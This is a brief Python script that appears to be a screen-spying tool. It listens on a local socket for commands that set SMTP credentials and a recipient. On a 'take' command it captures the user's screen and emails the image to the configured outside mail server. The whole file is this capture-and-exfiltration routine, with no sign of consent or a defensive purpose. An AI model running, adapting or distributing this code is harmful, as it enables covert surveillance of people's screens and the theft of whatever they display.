#-*-coding: utf-8-*-
from pyautogui import screenshot
from socket import *
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from datetime import datetime


if __name__ == '__main__':
	sock = socket(AF_INET, SOCK_STREAM)
	sock.bind(("127.0.0.1", 5000))
	sock.listen(1)
	conn, addr = sock.accept()
	password, user, urmail, server= str(), str(), str(), str()

	while True:
		cmd = conn.recv(1024).decode()
		if cmd[:4] == "logp":
			password = cmd[5:]
		elif cmd == "show options":
			conn.send("User: {}\nPassword: {}\nSend to: {}\nSMTP server: {}".format(user,password,urmail, server).encode())
		elif cmd[:6] == "sendto":
			urmail = cmd[7:]
		elif cmd[:4] == "logu":
			user = cmd[5:]
		elif cmd[:6] == "server":
			server = cmd[7:]
		elif cmd[:4] == "take":
			try:
				ss = screenshot()
				ss.save(cmd[5:])
				msg = MIMEMultipart()
				msg['From']=user
				msg['To']=urmail
				msg['Subject']="SSBD"
				msg.attach(MIMEText("Screenshot tomada el {}".format(datetime.now())))
				file = open(cmd[5:], "rb")
				attach_image = MIMEImage(file.read())
				attach_image.add_header('Content-Disposition', 'attachment; filename = "SCREENSHOT"')
				msg.attach(attach_image)
				server = SMTP(server)
				server.starttls()
				server.login(user, password)
				server.sendmail(user, urmail, msg.as_string())		
			except Exception as e:
				conn.send("{}".format(e).encode())